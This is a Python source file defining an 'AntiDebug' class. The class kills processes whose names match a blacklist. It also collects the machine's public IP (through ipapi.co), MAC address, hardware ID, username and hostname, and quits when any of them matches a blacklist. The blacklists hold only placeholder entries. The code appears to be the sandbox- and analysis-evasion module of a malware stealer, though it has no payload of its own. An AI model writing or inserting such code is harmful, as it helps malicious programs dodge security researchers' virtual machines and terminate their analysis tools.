import os
import re
import subprocess
import sys
import uuid
import psutil
import requests
from typing import Literal


class AntiDebug:
    def __init__(self) -> None:
        if self.checks():
            sys.exit(int())

    def checks(self) -> bool:
        debugging = False

        self.blackListedUsers = ['1e']
        self.blackListedPCNames = ['1e']
        self.blackListedHWIDS = ['1e']
        self.blackListedIPS = ['1e']
        self.blackListedMacs = ['1e']
        self.blacklistedProcesses = ["1e"]

        self.check_process()
        if self.get_network():
            debugging = True
        if self.get_system():
            debugging = True

        return debugging

    def check_process(self) -> None:
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    def get_network(self) -> Literal[True] | None:
        ip = requests.get('https://ipapi.co/ip/').text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))

        if ip in self.blackListedIPS:
            return True
        if mac in self.blackListedMacs:
            return True

    def get_system(self) -> Literal[True] | None:
        try:
            hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                                           stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        except:
            hwid = "None"

        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")

        for i in zip(self.blackListedHWIDS, self.blackListedUsers, self.blackListedPCNames):
            if hwid in i or username in i or hostname in i:
                return True
